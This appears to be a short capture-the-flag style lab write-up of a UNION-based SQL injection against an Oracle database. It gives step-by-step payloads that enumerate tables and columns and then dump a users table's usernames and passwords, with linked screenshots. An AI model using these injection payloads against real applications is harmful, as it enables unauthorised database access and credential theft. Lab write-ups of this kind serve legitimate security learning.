Goal: LIst the data of the databases.\
What we know - two columns in the category section.\
             - oracle database\
step 1 - Get tabel Names\
 ' UNION SELECT table_name,NULL FROM all_tables --\
<img width="1602" height="907" alt="image" src="https://github.com/user-attachments/assets/d8b90520-9a42-4319-bddc-ecaee3ed3003" />\
Guess what I found \
   USERS_CPLYZW\
step 2 - Get the columns names\
 ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_CPLYZW'--\
<img width="1602" height="912" alt="image" src="https://github.com/user-attachments/assets/15bf1c90-8b56-4580-9245-82a042875ba1" />\
USERNAME_OIAGCC\
<img width="1600" height="907" alt="image" src="https://github.com/user-attachments/assets/533ab3eb-ba58-4e7a-a6fe-59b97d5e2f55" />\
PASSWORD_DURFLT\
Step 3- Whats next?,you guessed it right.Dump the table data.\
  ' UNION SELECT USERNAME_OIAGCC,PASSWORD_DURFLT FROM  USERS_CPLYZW--\
  <img width="1609" height="900" alt="image" src="https://github.com/user-attachments/assets/7b46276a-f191-4c90-a7bb-ccecfd5f3aa2" />\
step 4 - Finish what you started\
<img width="1829" height="910" alt="image" src="https://github.com/user-attachments/assets/5d94edba-5c05-4489-98cb-1f1a211b2917" />\
#PURE HAPPINESS



  
